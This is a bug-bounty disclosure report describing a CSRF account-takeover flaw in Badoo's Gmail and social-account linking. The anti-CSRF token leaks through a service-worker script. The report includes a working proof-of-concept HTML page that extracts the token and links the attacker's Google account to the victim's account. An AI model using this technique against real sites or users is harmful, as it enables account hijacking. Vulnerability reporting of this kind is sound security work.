## Original Report

Hi , I have found a CSRF issue that allows an attacker to link his gmail , facebook ... or any social account to the victim's account and hijack the whole account.
#Details:
When a user tries to link a gmail account with his account , after he authorizes badoo to use his gmail account he will be redirected to `https://eu1.badoo.com/google/verify.phtml?rt=<State_param_value>&code=<Code_returned_from_google>` , the only thing that protects from CSRF is the `rt` parameter which is unique for each user/session . I have noticed that the `rt` parameter is returned on almost all json responses so I tried to find a link that leaks it. After digging for a while , I have found this link https://eu1.badoo.com/worker-scope/chrome-service-worker.js , and I was surprised that it contains the `rt` parameter value!! 
if you open the link `https://eu1.badoo.com/worker-scope/chrome-service-worker.js ` you'll find a string variable `url_stats` containing the value of the `rt` parameter:
```javascript
var url_stats = 'https://eu1.badoo.com/chrome-push-stats?ws=1&rt=<rt_param_value>';
```
So, now I got a javascript file with the `rt` param value and I can use it to link any malicious social media account with it. 
#Here is a PoC: 
Here is a live PoC: http://azzazpp.com/badoo.html which will link a dummy gmail account of mine to your badoo account. Go to https://eu1.badoo.com/settings then check your social accounts and you will see a gmail account with the name `Mahmoud Gamal` added to your social accounts.

```
<html>
<head>
<title>Badoo account take over</title>
<script src=https://eu1.badoo.com/worker-scope/chrome-service-worker.js?ws=1></script>
</head>
<body>
<script>
function getCSRFcode(str) {
    return str.split('=')[2];
}
window.onload = function(){
var csrf_code = getCSRFcode(url_stats);
csrf_url = 'https://eu1.badoo.com/google/verify.phtml?code=4/nprfspM3yfn2SFUBear08KQaXo609JkArgoju1gZ6Pc&authuser=3&session_state=7cb85df679219ce71044666c7be3e037ff54b560..a810&prompt=none&rt='+ csrf_code;
window.location = csrf_url;
};
</script>
```
After an attacker links his gmail , facebook or any social account to the victim's account , he can use it to login to the victim's account and do any modifications he wants.
Please tell me if you are having any problems reproducing this.
Thanks!
